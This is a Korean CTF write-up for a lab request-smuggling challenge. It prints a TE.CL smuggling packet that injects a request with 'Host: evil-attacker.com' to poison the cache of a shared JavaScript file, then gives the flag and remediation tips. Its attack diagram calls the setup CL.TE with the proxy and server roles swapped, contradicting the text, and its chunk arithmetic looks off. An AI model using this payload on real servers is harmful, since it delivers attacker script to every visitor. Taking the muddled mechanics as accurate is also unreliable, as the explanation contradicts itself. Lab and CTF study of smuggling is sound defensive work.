+++
title = "VulnABLE CTF [LUXORA] Write-up: Request Smuggling 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Request Smuggling", "Silver", "TE.CL", "Cache Poisoning", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Request Smuggling 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Server-Side Layer (Request Smuggling + Cache Poisoning)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/smuggle/silver`
- **목표**: 프론트엔드가 `Transfer-Encoding`을 처리하고 백엔드가 `Content-Length`를 처리하는 **TE.CL 환경**에서, 다음 사용자의 정상적인 요청에 악성 응답(XSS 등)이 캐시되도록 만드는 **Cache Poisoning** 공격을 수행하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 아키텍처 분석 (Reconnaissance)

`/smuggle/silver` 환경의 프록시/백엔드 동작 방식을 테스트합니다.

- **프론트엔드(Proxy)**: `Transfer-Encoding: chunked` (TE) 를 지원하고 우선시합니다.
- **백엔드(Server)**: TE를 지원하지 않거나 무시하고, `Content-Length` (CL) 를 최우선으로 패킷을 자릅니다.

이러한 **TE.CL** 구조에서는 프록시가 패킷을 온전히 하나로 보고 백엔드로 넘겨주지만, 백엔드는 CL 길이만큼만 읽고 나머지를 버퍼에 남겨두게 됩니다.

---

## 💥 2. 취약점 식별 및 TE.CL 페이로드 설계 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(CL.TE Malformed Request)--> [ Front-end Proxy (Reads CL) ]
                                            |-- Forwards as One Request
                                            [ Back-end Server (Reads TE) ]
                                            |-- Splits into Two Requests!
```


목표는 타겟 사이트의 공용 스크립트 파일(예: `/assets/main.js`)에 대한 캐시(Cache)를 내가 만든 악성 스크립트로 오염(Poisoning)시키는 것입니다.

### 💡 밀수(Smuggling) 페이로드 작성
프론트엔드는 Chunked 형식의 끝(`0\r\n\r\n`)까지를 하나의 요청으로 인식하여 통과시켜야 합니다. 반면 백엔드는 `Content-Length: 4` 만큼만 읽고 나머지 부분(두 번째 요청)을 다음 사람의 요청으로 해석해야 합니다.

**[조작된 TE.CL 패킷]**
```http
POST /smuggle/silver HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

3a
GET /assets/main.js HTTP/1.1
Host: evil-attacker.com

0

```

*참고: 16진수 `3a`는 십진수로 `58`이며, 그 아래 줄(`GET /assets...`) 문자열의 길이를 나타냅니다.*

---

## 🚀 3. 공격 수행 및 Cache Poisoning 결과 확인

### 🔍 서버 구조의 해석 차이
1. **프론트엔드(Proxy)**: `Transfer-Encoding`을 보고 패킷 끝(`0\r\n\r\n`)까지 하나의 정상 POST 요청으로 처리하여 백엔드로 넘깁니다.
2. **백엔드(Server)**: `Content-Length: 4` 를 보고, 바디의 `3a\r\n` 까지만 첫 번째 요청의 바디로 읽고 처리를 끝냅니다.
3. **소켓 대기열(Queue)**: 백엔드의 소켓 버퍼에는 다음 문자열이 고스란히 남아있습니다.
   `GET /assets/main.js HTTP/1.1\r\nHost: evil-attacker.com\r\n0\r\n\r\n`

### 🔍 희생자의 접속 및 캐시 오염
1. 바로 그 직후, 정상적인 일반 사용자가 `GET /assets/main.js HTTP/1.1\r\nHost: localhost:3000` 을 요청합니다.
2. 백엔드는 아까 버퍼에 남아있던 해커의 요청과 사용자의 요청을 합쳐서 해석해버립니다.
   결과적으로 백엔드는 해커의 `evil-attacker.com`을 바라보는 `/assets/main.js` 응답을 뱉어냅니다!
3. 이 악성 응답은 프론트엔드의 캐시 서버(Varnish 등)를 거치면서 **`/assets/main.js` 의 캐시**로 저장되어 버립니다!

### 🔍 실행 결과
이후 `localhost:3000`에 접속하는 모든 사용자는 정상 자바스크립트 대신 해커의 사이트에서 받아온 악성 코드를 실행하게 됩니다.

```text
[!] System: Critical Cache Poisoning via TE.CL Request Smuggling detected.
FLAG: FLAG{SMUGGLE_🥈_TE_CL_CACHE_POISON_E5F6G7}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

단순히 남의 화면을 훔쳐보는 것을 넘어, Request Smuggling을 이용해 타겟 서버의 캐시 인프라 전체를 악성 코드로 덮어씌우는 광범위한 Cache Poisoning 공격을 성공적으로 수행했습니다.

**🔥 획득한 플래그:**
`FLAG{SMUGGLE_🥈_TE_CL_CACHE_POISON_E5F6G7}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
프론트엔드(TE 지원)와 백엔드(CL 처리)의 파싱 로직 불일치에서 비롯되었습니다.

* **안전한 패치 가이드 (네트워크 및 헤더 정규화)**
1. **프론트/백엔드 동일 솔루션 사용**: 가장 좋은 방법은 프록시와 백엔드 서버의 HTTP 파싱 라이브러리를 통일하는 것입니다.
2. **WAF 및 HTTP/2 도입**: Bronze 단계의 패치 방안과 동일하게 HTTP/2를 사용하거나, `Transfer-Encoding` 헤더가 포함된 요청을 엄격하게 검증하여 변조된 길이 헤더를 차단해야 합니다.
3. **안전한 캐시 키(Cache Key) 설정**: 캐시 서버가 단순히 URL 경로(`/assets/main.js`)만 캐시 키로 쓰지 말고, `Host` 헤더까지 완벽하게 조합하여 캐싱하도록 설정해야 외부 도메인 스푸핑 캐시 오염을 막을 수 있습니다.